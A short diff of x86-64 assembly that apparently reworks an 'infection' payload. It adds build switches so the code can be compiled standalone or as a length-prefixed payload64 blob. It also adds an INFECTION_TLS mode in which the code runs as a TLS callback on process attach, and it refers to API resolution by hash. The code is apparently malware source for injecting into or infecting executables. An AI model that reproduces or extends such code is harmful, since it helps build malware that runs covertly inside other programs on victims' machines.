@@ -5,17 +5,27 @@ section .text
 
 ; %define TLS
    
-global main
    ; this is now a TLS callback, which has the following header:
    ;
    ;    VOID (NTAPI *PIMAGE_TLS_CALLBACK)(PVOID DllHandle, DWORD Reason, PVOID Reserved)
+
+%ifdef INFECTION_STANDALONE
+global main
 main:
+%else
+global payload64
+payload64:
+   dd (module_end - payload64_code)
+   
+payload64_code:
+%endif
+   
    mov [rsp+0x20],r12
    mov [rsp+0x18],rsi
    mov [rsp+0x10],rdi
    mov [rsp+8],rbp
 
-%ifdef TLS
+%ifdef INFECTION_TLS
    cmp edx,1
    jnz infection__end           ; if the given Reason is DLL_PROCESS_ATTACH, do the needful
                                 ; otherwise, terminate the infection.
@@ -266,3 +276,4 @@ get_proc_by_hash__epilogue:
    mov rdi,[rsp+0x18]
    ret
    
+module_end:
